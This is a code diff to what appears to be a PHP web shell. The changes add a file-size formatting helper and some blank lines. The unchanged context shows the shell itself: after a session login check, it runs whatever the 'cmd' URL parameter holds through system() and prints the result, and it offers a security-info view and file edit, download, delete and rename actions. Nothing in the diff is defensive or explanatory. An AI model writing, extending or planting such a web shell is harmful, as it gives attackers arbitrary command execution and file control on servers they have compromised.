@@ -515,6 +515,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 			if(isset($_GET['cmd'])){
 		?>
 		<tr>
+		
 		<td>
 		<?php
 		//Filter Command For Windows And For Unix
@@ -530,6 +531,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 			}
 		} 
 		?>
+		
 		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;">
 		<?=system($_GET['cmd'])?>
 		</textarea></td>
@@ -537,6 +539,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		<?php
 		}
 		?>
+		
 		<?php
 		//Show Security Information
 		if(isset($_GET['action']) & $_GET['action']=="secinfo"){
@@ -578,6 +581,51 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 							}
 						}
 
+						/* Convert File Size 
+						http://php.net/manual/en/function.filesize.php
+						*/
+						function FileSizeConvert($bytes)
+						{
+							$bytes = floatval($bytes);
+								$arBytes = array(
+									0 => array(
+										"UNIT" => "TB",
+										"VALUE" => pow(1024, 4)
+									),
+									1 => array(
+										"UNIT" => "GB",
+										"VALUE" => pow(1024, 3)
+									),
+									2 => array(
+										"UNIT" => "MB",
+										"VALUE" => pow(1024, 2)
+									),
+									3 => array(
+										"UNIT" => "KB",
+										"VALUE" => 1024
+									),
+									4 => array(
+										"UNIT" => "B",
+										"VALUE" => 1
+									),
+								);
+
+							foreach($arBytes as $arItem)
+							{
+								if($bytes >= $arItem["VALUE"])
+								{
+									$result = $bytes / $arItem["VALUE"];
+									$result = str_replace(".", "," , strval(round($result, 2)))." ".$arItem["UNIT"];
+									break;
+								}
+							}
+							if(empty($result)){
+							$result = "Folder";
+							return $result;
+							}else{
+							return $result;
+						}}
+
 						sort($files);
 						/**
 						 * Ini untuk download file
@@ -586,7 +634,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 						 */
 						foreach($files as $f) {
 							echo "
-							<tr style='font-size:12px;'><td>$f</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>";
+							<tr style='font-size:12px;'><td>$f</td><td>".FileSizeConvert(filesize($f))."</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>";
 						}
 
 						closedir($handle);
